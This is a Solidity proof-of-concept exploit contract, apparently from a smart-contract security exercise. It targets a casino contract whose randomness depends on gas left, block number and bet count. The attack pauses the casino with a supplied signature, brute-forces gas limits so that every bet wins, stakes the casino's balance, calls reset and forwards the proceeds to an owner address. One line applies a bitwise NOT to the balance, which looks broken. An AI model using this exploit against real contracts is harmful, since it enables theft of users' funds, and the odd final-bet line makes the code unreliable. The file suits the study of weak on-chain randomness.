// SPDX-License-Identifier: MIT
pragma solidity 0.8.28; 

import {console2 as console} from "forge-std/Test.sol";

interface PoCCasino {
    function pause(bytes calldata signature, bytes32 salt) external;
    function reset(
        bytes calldata signature,
        address payable receiver,
        uint256 amount,
        bytes32 salt
    ) external;
    function bet(uint256 amount) external returns (bool);
    function deposit(address receiver) external payable;
    function totalBets() external view returns (uint256);
    function balances(address) external view returns (uint256);
    function paused() external view returns (bool);
}

contract PoC {
    PoCCasino public casino;
    address payable public owner;

    struct PauseData {
        bytes signature;
        bytes32 salt;
    }

    struct ResetData {
        bytes signature;
        address payable receiver;
        uint256 amount;
        bytes32 salt;
    }

    event Success(uint256 balance, uint256 reversedAmount);

    constructor(address _casino, address payable _owner) {
        casino = PoCCasino(_casino);
        owner = _owner;
    }

    fallback() external payable {
        owner.call{value: msg.value}("");
    }

    function attack(
        PauseData calldata pauseData,
        ResetData calldata resetData
    ) external payable {
        casino.pause(pauseData.signature, pauseData.salt);

        casino.deposit{value: msg.value}(address(this));

        for (uint256 i = 0; i < 199; i++) {
            uint256 gasToUse = 30_000;

            uint256 totalBets = casino.totalBets();
            uint256 balance = casino.balances(address(this));

            for (uint256 j = 0; j < 100; j++) {
                uint256 gasLeft = gasToUse - 720;
                uint256 random = uint256(
                    keccak256(abi.encode(gasLeft, block.number, totalBets))
                );
                bool win = random % 2 == 1;

                if (win) break;
                else gasToUse++;
            }

            require(casino.bet{gas: gasToUse}(balance), "didn't win");
        }

        uint256 gasToUse = 30_000;
        uint256 totalBets = casino.totalBets();

        for (uint256 j = 0; j < 100; j++) {
            uint256 gasLeft = gasToUse - 719;
            uint256 random = uint256(
                keccak256(abi.encode(gasLeft, block.number, totalBets))
            );
            bool win = random % 2 == 1;

            if (win) break;
            else gasToUse++;
        }

        require(casino.bet{gas: gasToUse}(~address(casino).balance - casino.balances(address(this))), "didn't win");

        casino.reset(
            resetData.signature,
            resetData.receiver,
            resetData.amount,
            resetData.salt
        );
    }

    function checkSuccess(
        uint256 gas,
        uint256 blocknumber,
        uint256 totalBets
    ) internal pure returns (bool) {
        return
            uint256(keccak256(abi.encode(gas, blocknumber, totalBets))) % 2 ==
            1;
    }
}
